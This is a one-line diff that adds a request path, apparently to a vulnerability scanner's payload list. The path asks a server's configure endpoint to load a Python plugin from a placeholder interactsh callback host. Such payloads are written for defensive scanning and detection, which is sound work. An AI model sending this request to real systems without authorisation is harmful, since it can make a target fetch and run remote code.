@@ -1,0 +1,1 @@
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
